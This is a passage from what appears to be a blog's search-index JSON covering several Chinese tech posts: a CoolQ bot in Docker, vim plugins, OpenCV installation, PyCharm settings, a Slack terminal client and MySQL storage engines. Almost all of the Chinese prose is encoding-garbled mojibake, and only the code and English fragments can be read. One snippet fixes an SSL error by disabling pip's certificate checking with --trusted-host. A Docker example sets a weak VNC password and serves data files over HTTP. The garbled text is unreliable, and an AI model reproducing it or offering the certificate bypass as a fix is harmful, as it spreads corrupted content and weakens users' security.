https://cqp.cc/, ä½¿ç”¨å¹¶ä¸”æµ‹è¯•æˆåŠŸ.  æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯é…·Qçš„Airç‰ˆè¿˜æ˜¯å…è´¹çš„.\n\n\n\n<!-- more -->\n\n### 1. ä¸‹è½½ä½¿ç”¨\n\né…·Qå®˜æ–¹ä¸‹è½½çš„æ˜¯windowsç‰ˆæœ¬(https://cqp.cc/t/23253) , éœ€è¦åœ¨windowsä¸Šè¿è¡Œå¹¶ç™»å½•QQ. è¿™ä¸ªè™½ç„¶ç®€å•æ–¹ä¾¿, ä½†æ˜¯éœ€è¦ä¸€ç›´åœ¨windowsä¸ŠæŒ‚ç€, å¾ˆæ˜¾ç„¶è¿™ä¸ªæ¡ä»¶ä¸å¤ªå…·å¤‡.\n\nç›®çš„æ˜¯åœ¨linuxä¸ŠæŒ‚æœºè¿è¡Œé…·Q, æ‰€ä»¥æ‰¾åˆ°äº†é…·Qçš„`docker`ç‰ˆæœ¬.\n\n\n\n### 2. å®‰è£…é…·Q dockerç‰ˆæœ¬\n\n+ å®‰è£…docker(å·²å®‰è£…dockerç›´æ¥çœ‹ä¸‹ä¸€æ­¥)\n\n```shell\nyum install yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\nyum install docker-ce\n\n\nsystemctl start docker\nsystemctl enable docker\n```\n\n\n\n+ å®‰è£…é…·Qå®˜æ–¹ docker ç‰ˆæœ¬  https://cqp.cc/t/34558 (å»ºè®®å®‰è£…ä¸‹é¢çš„CoolQæ’ä»¶ç‰ˆæœ¬)\n\n```shell\ndocker pull coolq/wine-coolq\nmkdir /root/coolq-data # ç”¨äºå­˜å‚¨é…· Q çš„ç¨‹åºæ–‡ä»¶\n\ndocker run --name=coolq --d \\\n-p 9001:9000 \\ # noVNC ç«¯å£ï¼Œç”¨äºä»æµè§ˆå™¨æ§åˆ¶é…· Q\n-v /root/coolq-data:/home/user/coolq \\ # å°†å®¿ä¸»ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…ç”¨äºæŒä¹…åŒ–é…· Q çš„ç¨‹åºæ–‡ä»¶\n-e VNC_PASSWD=12345678 \\ # è®¾ç½®noVNCç™»å½•å¯†ç , é»˜è®¤å¯†ç æ˜¯ MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # è¦ç™»å½•çš„ QQ è´¦å·ï¼Œå¯é€‰\ncoolq/wine-coolq\n```\n\næ­¤æ—¶åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://ä½ çš„æœåŠ¡å™¨IP:ä½ çš„ç«¯å£ å³å¯çœ‹åˆ°è¿œç¨‹æ“ä½œç™»å½•é¡µé¢ï¼Œè¾“å…¥å¯†ç ï¼Œå³å¯çœ‹åˆ° é…·Q Air çš„ç™»å½•ç•Œé¢å•¦ã€‚\n\n\n\n+ å®‰è£…CoolQæ’ä»¶çš„ docker ç‰ˆæœ¬ https://github.com/richardchien/coolq-http-api\n\nCoolQæ’ä»¶é€šè¿‡ HTTP æˆ– WebSocket å¯¹é…· Q çš„äº‹ä»¶è¿›è¡Œä¸ŠæŠ¥ä»¥åŠæ¥æ”¶è¯·æ±‚æ¥è°ƒç”¨é…· Q çš„ DLL æ¥å£ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨å…¶å®ƒè¯­è¨€ç¼–å†™é…· Q æ’ä»¶ã€‚\n\n  \n\n```shell\ndocker pull richardchien/cqhttp:latest\nmkdir coolq  # ç”¨äºå­˜å‚¨é…· Q çš„ç¨‹åºæ–‡ä»¶\n\ndocker run -ti -d --name cqhttp-test \\\n-v $(pwd)/coolq:/home/user/coolq \\  # å°†å®¿ä¸»ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…ç”¨äºæŒä¹…åŒ–é…· Q çš„ç¨‹åºæ–‡ä»¶\n-p 9001:9000 \\ # noVNC ç«¯å£ï¼Œç”¨äºä»æµè§ˆå™¨æ§åˆ¶é…· Q\n-p 5700:5700 \\ # HTTP API æ’ä»¶å¼€æ”¾çš„ç«¯å£\n-e VNC_PASSWD=12345678 \\ # è®¾ç½®noVNCç™»å½•å¯†ç , é»˜è®¤å¯†ç æ˜¯ MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # è¦ç™»å½•çš„ QQ è´¦å·ï¼Œå¯é€‰\n-e CQHTTP_SERVE_DATA_FILES=yes \\ # å…è®¸é€šè¿‡ HTTP æ¥å£è®¿é—®é…· Q æ•°æ®æ–‡ä»¶\nrichardchien/cqhttp:latest\n```\n\n\n\n### 3. å‘é€æ¶ˆæ¯åˆ°qqç¾¤\n\nå…¶å®QQæœºå™¨äººä¸ä»…èƒ½å‘é€æ¶ˆæ¯åˆ°qqç¾¤, è¿˜èƒ½å‘é€æ¶ˆæ¯åˆ°ä¸ªäºº, è½¬å‘ç¾¤æ¶ˆæ¯, åŠ å¥½å‹, è¸¢äººç­‰ä¸€ç³»åˆ—æ“ä½œ\n\nè¯¦è§apiåˆ—è¡¨:  https://richardchien.gitee.io/coolq-http-api/docs/4.8/#/API\n\n\n\n+ è°ƒç”¨æ–¹å¼ä¹Ÿå¾ˆç®€å•, å‚è§apiæ–‡æ¡£\n\n```\nPOST  http://ip:5700/send_group_msg\n\ngroup_id: qqç¾¤å·\nmessage: å‘é€çš„æ¶ˆæ¯\n```\n\n\n\n### 4. é…·Qæœºå™¨äººAIèŠå¤©\n\næœºå™¨äººè¿˜æœ‰ä¸ªç”¨å¤„å°±æ˜¯å¯ä»¥å®ç°AIè‡ªåŠ¨èŠå¤©.\n\nç›®å‰é…·Qæ”¯æŒ å›¾çµæœºå™¨äºº(http://www.turingapi.com/)å’Œå°iæœºå™¨äºº(http://cloud.xiaoi.com/)\n\nå®‰è£…é…·Qå,æ·»åŠ å¯¹åº”çš„ç¨‹åºå³å¯","tags":["robot"],"categories":["çˆ¬è™«"]},{"title":"vimå®ç”¨æ’ä»¶çš„ä½¿ç”¨","url":"%2Fp%2F999f6ee6.html","content":"\nå·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨,  è®°å½•ä¸€äº› vim å¸¸ç”¨çš„æ’ä»¶ã€‚\n\n# 1. æ’ä»¶ç®¡ç†vim-plug\n\né¡¹ç›®åœ°å€: https://github.com/junegunn/vim-plug\n\n<!-- more -->\n\n### 1.1 å®‰è£…\n\n```Â bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### 1.2 ä½¿ç”¨\n\n```yml\ncall plug#begin('~/.vim/plugged')\nPlug 'tpope/vim-sensible'\nPlug 'junegunn/seoul256.vim'\ncall plug#end()\n```\n\n+ å®‰è£…æ’ä»¶: PlugInstall\n+ å¸è½½æ’ä»¶: PlugClean\n\n\n\n# 2. ä¸»é¢˜gruvbox\n\né¡¹ç›®åœ°å€: https://github.com/morhetz/gruvbox\n\n### 2.1 å®‰è£…\n\n```yml\nPlug 'morhetz/gruvbox'\n```\n\n\n\n# 3. çŠ¶æ€æ airline\n\né¡¹ç›®åœ°å€: https://github.com/vim-airline/vim-airline\n\n### 3.1 å®‰è£…\n\n```yml\nPlug 'vim-airline/vim-airline'\nPlug 'vim-airline/vim-airline-themes'\nlet g:airline#extensions#tabline#enabled = 1\nlet g:airline_theme='simple' \" https://github.com/vim-airline/vim-airline/wiki/Screenshots\n```\n\n\n\n# 4. æ¨¡ç³Šæœç´¢fzf \n\n### 4.1 å®‰è£…\n\n```yml\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"æé™æœç´¢æ–‡ä»¶\nPlug 'junegunn/fzf.vim'\n```\n\n\n\n# 5. æé™è·³è½¬easymotion\n\n### 5.1 å®‰è£…\n\n```yml\nPlug 'easymotion/vim-easymotion' \"æé€Ÿæœç´¢è·³è½¬\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>l <Plug>(easymotion-lineforward)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>h <Plug>(easymotion-linebackward)\n```\n\n\n\n# 10. å‚è€ƒèµ„æ–™\n\n+ https://github.com/topics/vim\n\n","tags":["vim"],"categories":["vim"]},{"title":"opencvåœ¨pythonä¸‹çš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2F415d206d.html","content":"\n\n\n### å®‰è£…opencv\n\n\n```shell\npip3 install numpy\npip3 install opencv-python\n```\n\nåœ¨å®‰è£…`opencv-python`å‡ºç°äº†ä»¥ä¸‹é”™è¯¯ä¿¡æ¯:\n\n```\n Could not fetch URL https://pypi.org/simple/opencv-python/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/opencv-python/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:726)'),)) - skipping\n```\n\nè§£å†³æ–¹æ¡ˆ: \n\n```shell\npip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org opencv-python\n```\n\n\n\n<!-- more -->\n\n### opencv rotate code\n\n```python\nimport sys\nimport cv2\nimport numpy as np\n\n\nif len(sys.argv) != 2 :\n    print(\"usage: ./images path\")\n    sys.exit(1)\n\nimg = cv2.imread(sys.argv[1])\ncv2.imshow(\"Source\", img)\n\nimg90 = np.rot90(img) # æ—‹è½¬90\ncv2.imshow(\"Rotate\", img90)\n\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n```\n","tags":["python"],"categories":["python"]},{"title":"opencvåœ¨macæºç å®‰è£…å¹¶è¿è¡Œcppç‰ˆ","url":"%2Fp%2F9c99a6b7.html","content":"\n\n\n### 1. mac å®‰è£… cmake\n\n+ ä¸‹è½½å®‰è£… CMakeã€‚\n\n  https://cmake.org/download/   Mac OS X 10.7 or later\n\n+ å®‰è£…å®Œæˆä¹‹åï¼Œä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åˆ›å»º/usr/local/binä¸‹ CMake çš„è½¯é“¾æ¥ã€‚\n\n```shell\nsudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\n```\n\n\n\n### 2. æºç å®‰è£… opencv\n\nç›®å‰opencvå·²ç»å‡ºåˆ°4.0+ç‰ˆæœ¬äº†, ç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹éƒ½æ˜¯2.0,3.0ç‰ˆæœ¬çš„.\n\nä¸è¿‡æˆ‘ä»¬é€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬, ç›´æ¥ä»githubä¸Šæ‹‰å–\n\n```shell\ngit clone https://github.com/opencv/opencv.git\nmkdir build\ncd build\ncmake ..\nmake \nsudo make install\n```\n\n<!-- more -->\n\n### 3. xcode é…ç½®opencv\n\nå¦‚æœä¸æƒ³ç”¨xcodeæ¥å¼€å‘, ç¼–è¯‘çš„æ—¶å€™ç›´æ¥æŒ‡å®šä¸‹é¢çš„é€‰é¡¹\n\n+ Header Search Paths\n\n```\n/usr/local/include/opencv4  (ä¸ä¸€å®šæ˜¯è¿™ä¸ª, è¦çœ‹ä½ çš„make install å®‰è£…åˆ°å“ªä¸ªç›®å½•äº†)\n```\n\n+ Library Search Paths\n\n```\n/usr/local/lib (ä¸ä¸€å®šæ˜¯è¿™ä¸ª, è¦çœ‹ä½ çš„make install å®‰è£…åˆ°å“ªä¸ªç›®å½•äº†)\n```\n\n+ Other Linker Flags\n\n```\n-lopencv_calib3d -lopencv_core -lopencv_dnn -lopencv_features2d -lopencv_flann -lopencv_gapi -lopencv_highgui -lopencv_imgcodecs -lopencv_imgproc -lopencv_ml -lopencv_objdetect -lopencv_photo -lopencv_stitching -lopencv_video -lopencv_videoio \n```\n\nä¸ä¸€å®šæ˜¯è¿™äº›, è¦å»`/usr/local/lib` æ–‡ä»¶å¤¹(`make install`å®‰è£…ç›®å½•)ä¸‹çœ‹ opencvå¼€å¤´çš„åº“\n\n\n\n\n### 4. opencv rotate code\n\n```cpp\n#include <stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage: ./images path angle\\n\");\n        return -1;\n    }\n    \n    Mat source = imread(argv[1], 1);\n    if (!source.data)\n    {\n        printf(\"No image data \\n\");\n        return -1;\n    }\n    \n    double angle = atof(argv[2]);\n    Point2f src_center(source.cols/2.0F, source.rows/2.0F);\n    Mat rot_mat = getRotationMatrix2D(src_center, angle, 1.0);\n    Mat dst;\n    warpAffine(source, dst, rot_mat, source.size());\n    \n\n    imshow(\"Source\", source);\n    imshow(\"Rotate\", dst);\n    waitKey(0);\n    \n    return 0;\n}\n```\n\n","tags":["opencv"],"categories":["c++"]},{"title":"pythonæœ€å¥½ç”¨IDEä¹‹pycharmçš„ä½¿ç”¨","url":"%2Fp%2Fb3d62374.html","content":"\n\n\nå·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨, å­¦ä¹  python è‡ªç„¶é€‰ç”¨äº† jetbrains å®¶æ—çš„ Pycharm.\n\n### 1. pycharm formatting on save\n\n1. PyCharm -> Preferences -> Plugins -> Save Actions -> install and restart ide\n2. PyCharm -> Preferences -> Save Actions -> Reformat file\n\n![1](pythonæœ€å¥½ç”¨IDEä¹‹pycharmçš„ä½¿ç”¨/1.png)\n\n<!-- more -->\n\n3. å–æ¶ˆPower Save Mode\n\n   IDEå³ä¸‹è§’æœ‰ä¸ªæœºå™¨äºº, ä¸€å®šä¸è¦å‹¾é€‰ Power Save Mode\n\n   å…·ä½“è¡¨ç°ï¼šå…³é—­åï¼ŒPycharmå°±è·Ÿæ–‡æœ¬ç¼–è¾‘å™¨å·®ä¸å¤šäº†ï¼Œä¸ä¼šå»å…³è”ä¸Šä¸‹æ–‡ï¼Œåƒçº é”™ã€è”æƒ³å…³é”®å­—ç­‰åŠŸèƒ½éƒ½æ²¡æœ‰äº†\n\n\n\n### 2. Keymap\n\nè¿›å…¥å‘ç°äº†, ctrl+w å’Œ ctrl+a å’Œ ctrl+e å¤±æ•ˆ, å¾ˆåˆ«æ‰­, ç ”ç©¶å‘ç°äº†, éœ€è¦åœ¨ Keymap é€‰æ‹©  `Mac OS X 10.5+`\n\nctrl + w å…³é—­\n\nctrl + a åˆ°è¡Œé¦–\n\nctrl + e åˆ°è¡Œå°¾\n\n\n\n### 3. Alt + Enter ä¸‡èƒ½ç»„åˆé”®\n\nimport åŒ…ç»å¸¸è¦ç”¨åˆ°è¿™ä¸ªç»„åˆé”®, ä½†æ˜¯å‘ç°åœ¨æˆ‘çš„ç”µè„‘ä¸Šåˆå¤±æ•ˆ\n\nç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ–¹æ³•ä¹Ÿæ²¡æœ‰è§£å†³. ä¸€è¯´æ˜¯å…¶ä»–ç¨‹åºå ç”¨, å¯ä»¥å…³é—­æ‰€æœ‰ç¨‹åºè¯•è¯•\n\næœ€åæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ, å°±æ˜¯æŠŠ`Save Actions`  æ’ä»¶åœæ‰, é‡å¯ä¹‹åå†å¼€å¯, å°±å¥½äº†(åè¡€)\n\n\n\n### 4. module unresolved reference\n\n- åœ¨é¡¹ç›®çš„æ–‡ä»¶å¤¹(module çš„ä¸Šä¸€çº§)å³é”® `Mark Directory as` -> `Source root`\n- `File` -> `Invalidate Caches / Restart` and restart PyCharm.","tags":["python"],"categories":["python"]},{"title":"slackçš„ç»ˆç«¯client","url":"%2Fp%2Fb47a642f.html","content":"\n# 1. slack terminal client\n\nè®© slack è¿è¡Œåœ¨ç»ˆç«¯é‡Œ, å¯ä»¥æ›´å¿«çš„çœ‹åˆ°æ¶ˆæ¯å¹¶å›å¤\n\n![Screenshot](slack%E7%9A%84%E7%BB%88%E7%AB%AFclient/screenshot.png)\n\n<!-- more -->\n\n# 2. å®‰è£…å’Œä½¿ç”¨\n\n### 2.1 å®‰è£…\n\nä¸‹è½½æœ€æ–°çš„release:  https://github.com/erroneousboat/slack-term/releases\n\n```bash\nmv slack-term-darwin-amd64 /usr/local/bin/slack-term\n\nslack-term --config ~/.config/slack-term/config # slack-termå¹¶æ²¡æœ‰ç”Ÿæˆé»˜è®¤é…ç½®, æ‰€ä»¥éœ€è¦å¸¦--configæŒ‡å®šæ–‡ä»¶\n```\n\n\n\n### 2.2 é…ç½®\n\n`vi ~/.config/slack-term/config`\n\n```ini\n{\n\t\"slack_token\": \"xoxp-\",\n\t\"emoji\": true\n}\n```\n\nè·å–tokenåœ°å€:  https://github.com/erroneousboat/slack-term/wiki#running-slack-term-without-legacy-tokens\n\næœ€ååˆ›å»ºä¸€ä¸ªåˆ«å:\n\n```bash\nalias slack=\"slack-term --config ~/.config/slack-term/config\"\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/erroneousboat/slack-term","tags":["slack"],"categories":["è½¯ä»¶"]},{"title":"mysqlä¸­myisamå’ŒinnodbåŒºåˆ«","url":"%2Fp%2Ff9fde0e9.html","content":"\n\n\n# 1. MySQLå­˜å‚¨å¼•æ“\n\n### 1.1 é»˜è®¤å­˜å‚¨å¼•æ“çš„å˜è¿\n\nåœ¨MySQL 5.1ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤çš„æœç´¢å¼•æ“æ˜¯MyISAMï¼Œä»MySQL 5.5ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤çš„æœç´¢å¼•æ“å˜æ›´ä¸ºInnoDBã€‚\n\nInnoDB æ”¯æŒäº‹åŠ¡ï¼ŒMyISAM ä¸æ”¯æŒäº‹åŠ¡ã€‚è¿™æ˜¯ MySQL å°†é»˜è®¤å­˜å‚¨å¼•æ“ä» MyISAM å˜æˆ InnoDB çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\nInnoDB æœ€å°çš„é”ç²’åº¦æ˜¯è¡Œé”ï¼ŒMyISAM æœ€å°çš„é”ç²’åº¦æ˜¯è¡¨é”ã€‚ä¸€ä¸ªæ›´æ–°è¯­å¥ä¼šé”ä½æ•´å¼ è¡¨ï¼Œå¯¼è‡´å…¶ä»–æŸ¥è¯¢å’Œæ›´æ–°éƒ½ä¼šè¢«é˜»å¡ï¼Œå› æ­¤å¹¶å‘è®¿é—®å—é™ã€‚è¿™ä¹Ÿæ˜¯ MySQL å°†é»˜è®¤å­˜å‚¨å¼•æ“ä» MyISAM å˜æˆ InnoDB çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\n<!-- more -->\n\n### 1.2 MyISAM\n\nMyISAMå­˜å‚¨å¼•æ“çš„ç‰¹ç‚¹æ˜¯ï¼šè¡¨çº§é”ã€**ä¸æ”¯æŒäº‹åŠ¡**å’Œ å…¨æ–‡ç´¢å¼•ï¼Œé€‚åˆä¸€äº›CMSå†…å®¹ç®¡ç†ç³»ç»Ÿä½œä¸ºåå°æ•°æ®åº“ä½¿ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨å¤§å¹¶å‘ã€é‡è´Ÿè·ç”Ÿäº§ç³»ç»Ÿä¸Šï¼Œè¡¨é”ç»“æ„çš„ç‰¹æ€§å°±æ˜¾å¾—åŠ›ä¸ä»å¿ƒï¼›\n\nMyISAMé€‚åˆï¼š\n\nï¼ˆ1ï¼‰åšå¾ˆå¤šcount çš„è®¡ç®—ï¼›\n\nï¼ˆ2ï¼‰æ’å…¥ä¸é¢‘ç¹ï¼ŒæŸ¥è¯¢éå¸¸é¢‘ç¹ï¼Œå¦‚æœæ‰§è¡Œå¤§é‡çš„SELECTï¼ŒMyISAMæ˜¯æ›´å¥½çš„é€‰æ‹©ï¼›\n\nï¼ˆ3ï¼‰æ²¡æœ‰äº‹åŠ¡ã€‚\n\n### 1.3 InnoDB\n\nInnoDBå­˜å‚¨å¼•æ“çš„ç‰¹ç‚¹æ˜¯ï¼šè¡Œçº§é”ã€äº‹åŠ¡å®‰å…¨ï¼ˆACIDå…¼å®¹ï¼‰ã€æ”¯æŒå¤–é”®ã€ä¸æ”¯æŒFULLTEXTç±»å‹çš„ç´¢å¼•(5.6.4ä»¥åç‰ˆæœ¬å¼€å§‹æ”¯æŒFULLTEXTç±»å‹çš„ç´¢å¼•)ã€‚\n\nInnoDBå­˜å‚¨å¼•æ“æä¾›äº†å…·æœ‰æäº¤ã€å›æ»šå’Œå´©æºƒæ¢å¤èƒ½åŠ›çš„äº‹åŠ¡å®‰å…¨å­˜å‚¨å¼•æ“ã€‚InnoDBæ˜¯ä¸ºå¤„ç†å·¨å¤§é‡æ—¶æ‹¥æœ‰æœ€å¤§æ€§èƒ½è€Œè®¾è®¡çš„ã€‚å®ƒçš„CPUæ•ˆç‡å¯èƒ½æ˜¯ä»»ä½•å…¶ä»–åŸºäºç£ç›˜çš„å…³ç³»æ•°æ®åº“å¼•æ“æ‰€ä¸èƒ½åŒ¹æ•Œçš„ã€‚\n\nInnoDBé€‚åˆï¼š\n\nï¼ˆ1ï¼‰å¯é æ€§è¦æ±‚æ¯”è¾ƒé«˜ï¼Œæˆ–è€…è¦æ±‚äº‹åŠ¡ï¼›\n\nï¼ˆ2ï¼‰è¡¨æ›´æ–°å’ŒæŸ¥è¯¢éƒ½ç›¸å½“çš„é¢‘ç¹ï¼Œå¹¶ä¸”è¡¨é”å®šçš„æœºä¼šæ¯”è¾ƒå¤§çš„æƒ…å†µæŒ‡å®šæ•°æ®å¼•æ“çš„åˆ›å»ºï¼›\n\nï¼ˆ3ï¼‰å¦‚æœä½ çš„æ•°æ®æ‰§è¡Œå¤§é‡çš„INSERTæˆ–UPDATEï¼Œå‡ºäºæ€§èƒ½æ–¹é¢çš„è€ƒè™‘ï¼Œåº”è¯¥ä½¿ç”¨InnoDBè¡¨ï¼›\n\nï¼ˆ4ï¼‰DELETE FROM tableæ—¶ï¼ŒInnoDBä¸ä¼šé‡æ–°å»ºç«‹è¡¨ï¼Œè€Œæ˜¯ä¸€è¡Œä¸€è¡Œçš„ åˆ é™¤ï¼›\n\nï¼ˆ5ï¼‰LOAD TABLE FROM MASTERæ“ä½œå¯¹InnoDBæ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè§£å†³æ–¹æ³•æ˜¯é¦–å…ˆæŠŠInnoDBè¡¨æ”¹æˆMyISAMè¡¨ï¼Œå¯¼å…¥æ•°æ®åå†æ”¹æˆInnoDBè¡¨ï¼Œä½†æ˜¯å¯¹äºä½¿ç”¨çš„é¢å¤–çš„InnoDBç‰¹æ€§ï¼ˆä¾‹å¦‚å¤–é”®ï¼‰çš„è¡¨ä¸é€‚ç”¨ã€‚\n\n\n\nè¦æ³¨æ„ï¼Œåˆ›å»ºæ¯ä¸ªè¡¨æ ¼çš„ä»£ç æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†æœ€åçš„ TYPEå‚æ•°ï¼Œè¿™ä¸€å‚æ•°ç”¨æ¥æŒ‡å®šæ•°æ®å¼•æ“ã€‚\n\n\n\n# 2. å…·ä½“åŒºåˆ«\n\n+ å­˜å‚¨ç»“æ„\n\nMyISAMï¼šæ¯ä¸ªMyISAMåœ¨ç£ç›˜ä¸Šå­˜å‚¨æˆä¸‰ä¸ªæ–‡ä»¶ã€‚åˆ†åˆ«ä¸ºï¼šè¡¨å®šä¹‰æ–‡ä»¶ã€æ•°æ®æ–‡ä»¶ã€ç´¢å¼•æ–‡ä»¶ã€‚ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„åå­—ä»¥è¡¨çš„åå­—å¼€å§‹ï¼Œæ‰©å±•åæŒ‡å‡ºæ–‡ä»¶ç±»å‹ã€‚.frmæ–‡ä»¶å­˜å‚¨è¡¨å®šä¹‰ã€‚æ•°æ®æ–‡ä»¶çš„æ‰©å±•åä¸º.MYD (MYData)ã€‚ç´¢å¼•æ–‡ä»¶çš„æ‰©å±•åæ˜¯.MYI (MYIndex)ã€‚\n\nInnoDBï¼šæ‰€æœ‰çš„è¡¨éƒ½ä¿å­˜åœ¨åŒä¸€ä¸ªæ•°æ®æ–‡ä»¶ä¸­ï¼ˆä¹Ÿå¯èƒ½æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œæˆ–è€…æ˜¯ç‹¬ç«‹çš„è¡¨ç©ºé—´æ–‡ä»¶ï¼‰ï¼ŒInnoDBè¡¨çš„å¤§å°åªå—é™äºæ“ä½œç³»ç»Ÿæ–‡ä»¶çš„å¤§å°ï¼Œä¸€èˆ¬ä¸º2GBã€‚\n\n\n\n+ ç´¢å¼•\n\nMyISAM: æ˜¯éèšé›†ç´¢å¼•ï¼Œæ•°æ®æ–‡ä»¶æ˜¯åˆ†ç¦»çš„ï¼Œç´¢å¼•ä¿å­˜çš„æ˜¯æ•°æ®æ–‡ä»¶çš„æŒ‡é’ˆã€‚ä¸»é”®ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•æ˜¯ç‹¬ç«‹çš„ã€‚\n\nInnoDB: æ˜¯èšé›†ç´¢å¼•ã€‚èšç°‡ç´¢å¼•çš„æ–‡ä»¶å­˜æ”¾åœ¨ä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ä¸Šï¼Œå› æ­¤ InnoDB å¿…é¡»è¦æœ‰ä¸»é”®ï¼Œé€šè¿‡ä¸»é”®ç´¢å¼•æ•ˆç‡å¾ˆé«˜ã€‚ä½†æ˜¯è¾…åŠ©ç´¢å¼•éœ€è¦ä¸¤æ¬¡æŸ¥è¯¢ï¼Œå…ˆæŸ¥è¯¢åˆ°ä¸»é”®ï¼Œç„¶åå†é€šè¿‡ä¸»é”®æŸ¥è¯¢åˆ°æ•°æ®ã€‚å› æ­¤ï¼Œä¸»é”®ä¸åº”è¯¥è¿‡å¤§ï¼Œå› ä¸ºä¸»é”®å¤ªå¤§ï¼Œå…¶ä»–ç´¢å¼•ä¹Ÿéƒ½ä¼šå¾ˆå¤§ã€‚\n\n\n\n+ å­˜å‚¨ç©ºé—´\n\nMyISAMï¼š MyISAMæ”¯æŒæ”¯æŒä¸‰ç§ä¸åŒçš„å­˜å‚¨æ ¼å¼ï¼šé™æ€è¡¨(é»˜è®¤ï¼Œä½†æ˜¯æ³¨æ„æ•°æ®æœ«å°¾ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¼šè¢«å»æ‰)ã€åŠ¨æ€è¡¨ã€å‹ç¼©è¡¨ã€‚å½“è¡¨åœ¨åˆ›å»ºä¹‹åå¹¶å¯¼å…¥æ•°æ®ä¹‹åï¼Œä¸ä¼šå†è¿›è¡Œä¿®æ”¹æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©è¡¨ï¼Œæå¤§çš„å‡å°‘ç£ç›˜çš„ç©ºé—´å ç”¨ã€‚\n\nInnoDBï¼š éœ€è¦æ›´å¤šçš„å†…å­˜å’Œå­˜å‚¨ï¼Œå®ƒä¼šåœ¨ä¸»å†…å­˜ä¸­å»ºç«‹å…¶ä¸“ç”¨çš„ç¼“å†²æ± ç”¨äºé«˜é€Ÿç¼“å†²æ•°æ®å’Œç´¢å¼•ã€‚\n\n\n\n+ å¯ç§»æ¤æ€§ã€å¤‡ä»½åŠæ¢å¤\n\nMyISAMï¼šæ•°æ®æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜å‚¨ï¼Œæ‰€ä»¥åœ¨è·¨å¹³å°çš„æ•°æ®è½¬ç§»ä¸­ä¼šå¾ˆæ–¹ä¾¿ã€‚åœ¨å¤‡ä»½å’Œæ¢å¤æ—¶å¯å•ç‹¬é’ˆå¯¹æŸä¸ªè¡¨è¿›è¡Œæ“ä½œã€‚\n\nInnoDBï¼šå…è´¹çš„æ–¹æ¡ˆå¯ä»¥æ˜¯æ‹·è´æ•°æ®æ–‡ä»¶ã€å¤‡ä»½ binlogï¼Œæˆ–è€…ç”¨ mysqldumpï¼Œåœ¨æ•°æ®é‡è¾¾åˆ°å‡ åGçš„æ—¶å€™å°±ç›¸å¯¹ç—›è‹¦äº†ã€‚\n\n\n\n+ äº‹åŠ¡æ”¯æŒ\n\nMyISAMï¼šå¼ºè°ƒçš„æ˜¯æ€§èƒ½ï¼Œæ¯æ¬¡æŸ¥è¯¢å…·æœ‰åŸå­æ€§,å…¶æ‰§è¡Œæ•°åº¦æ¯”InnoDBç±»å‹æ›´å¿«ï¼Œä½†æ˜¯ä¸æä¾›äº‹åŠ¡æ”¯æŒã€‚\n\nInnoDBï¼šæä¾›äº‹åŠ¡æ”¯æŒäº‹åŠ¡ï¼Œå¤–éƒ¨é”®ç­‰é«˜çº§æ•°æ®åº“åŠŸèƒ½ã€‚ å…·æœ‰äº‹åŠ¡(commit)ã€å›æ»š(rollback)å’Œå´©æºƒä¿®å¤èƒ½åŠ›(crash recovery capabilities)çš„äº‹åŠ¡å®‰å…¨(transaction-safe (ACID compliant))å‹è¡¨ã€‚\n\n\n\n+ AUTO_INCREMENT \n\nMyISAMï¼šå¯ä»¥å’Œå…¶ä»–å­—æ®µä¸€èµ·å»ºç«‹è”åˆç´¢å¼•ã€‚å¼•æ“çš„è‡ªåŠ¨å¢é•¿åˆ—å¿…é¡»æ˜¯ç´¢å¼•ï¼Œå¦‚æœæ˜¯ç»„åˆç´¢å¼•ï¼Œè‡ªåŠ¨å¢é•¿å¯ä»¥ä¸æ˜¯ç¬¬ä¸€åˆ—ï¼Œä»–å¯ä»¥æ ¹æ®å‰é¢å‡ 